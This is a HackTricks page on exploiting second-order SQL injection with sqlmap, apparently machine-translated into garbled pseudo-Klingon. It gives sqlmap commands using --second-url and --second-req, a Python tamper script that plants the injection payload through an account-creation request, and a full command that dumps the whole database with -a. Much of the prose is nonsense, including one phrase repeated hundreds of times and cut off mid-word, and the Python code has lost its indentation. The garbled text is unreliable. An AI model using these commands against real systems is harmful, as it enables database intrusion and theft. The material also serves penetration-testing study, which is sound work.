<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a> <strong>tlhIngan Hol</strong></summary>

**HackTricks** poHmoH:

* **HackTricks** **Dochmey** **advertised** **company** **want** **download HackTricks** **PDF** **Check** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* **official PEASS & HackTricks swag** **Get** [**swag**](https://peass.creator-spring.com)
* **PEASS Family** **Discover** [**The PEASS Family**](https://opensea.io/collection/the-peass-family), **exclusive NFTs** **collection** [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) **telegram group** **follow** **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share** **hacking tricks** **submitting PRs** [**HackTricks**](https://github.com/carlospolop/hacktricks) **HackTricks Cloud** **github repos**.

</details>


**SQLMap** **Second Order SQLis** **exploit** **can**.\
**provide** **need**:

* **request** **sqlinjection payload** **saved**
* **request** **payload** **executed**

**SQL injection payload** **saved** **request** **indicated** **any other injection in sqlmap**. **output/execution** **injection** **sqlmap** **read** **request** `--second-url` **indicated** `--second-req` **need** **complete request** **indicate** **file**.

**Simple second order example:**
```bash
#Get the SQL payload execution with a GET to a url
sqlmap -r login.txt -p username --second-url "http://10.10.10.10/details.php"

#Get the SQL payload execution sending a custom request from a file
sqlmap -r login.txt -p username --second-req details.txt
```
**ghItlhmeH** **vItlhutlh** **ghaH** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **payload** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pagh** **'e'** **vItlhutlh** **'ej** **pag
```python
#!/usr/bin/env python

import re
import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
pass

def login_account(payload):
proxies = {'http':'http://127.0.0.1:8080'}
cookies = {"PHPSESSID": "6laafab1f6om5rqjsbvhmq9mf2"}

params = {"username":"asdasdasd", "email":payload, "password":"11111111"}
url = "http://10.10.10.10/create.php"
pr = requests.post(url, data=params, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

url = "http://10.10.10.10/exit.php"
pr = requests.get(url, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

def tamper(payload, **kwargs):
headers = kwargs.get("headers", {})
login_account(payload)
return payload
```
**SQLMap tamper jatlhlaHbe'chugh injection try payload vItlhutlh. vaj payload vItlhutlh.** **vaj payload vItlhutlh.** vaj payload vItlhutlh. vaj payload vItlhutlh.

So, vaj reason vItlhutlh vaj second order SQL injection exploit vItlhutlh:

* "email" field vIlo'laHbe'chugh SQLi payload account yInIDlu'
* Logout
* account vIlo'laHbe'chugh login (login.txt)
* SQL injection vIlo'laHbe'chugh request yInIDlu' (second.txt)

**This sqlmap line will help:**
```bash
sqlmap --tamper tamper.py -r login.txt -p email --second-req second.txt --proxy http://127.0.0.1:8080 --prefix "a2344r3F'" --technique=U --dbms mysql --union-char "DTEC" -a
##########
# --tamper tamper.py : Indicates the tamper to execute before trying each SQLipayload
# -r login.txt : Indicates the request to send the SQLi payload
# -p email : Focus on email parameter (you can do this with an "email=*" inside login.txt
# --second-req second.txt : Request to send to execute the SQLi and get the ouput
# --proxy http://127.0.0.1:8080 : Use this proxy
# --technique=U : Help sqlmap indicating the technique to use
# --dbms mysql : Help sqlmap indicating the dbms
# --prefix "a2344r3F'" : Help sqlmap detecting the injection indicating the prefix
# --union-char "DTEC" : Help sqlmap indicating a different union-char so it can identify the vuln
# -a : Dump all
```
<details>

<summary><strong>qaStaHvIS AWS hacking vItlhutlh</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
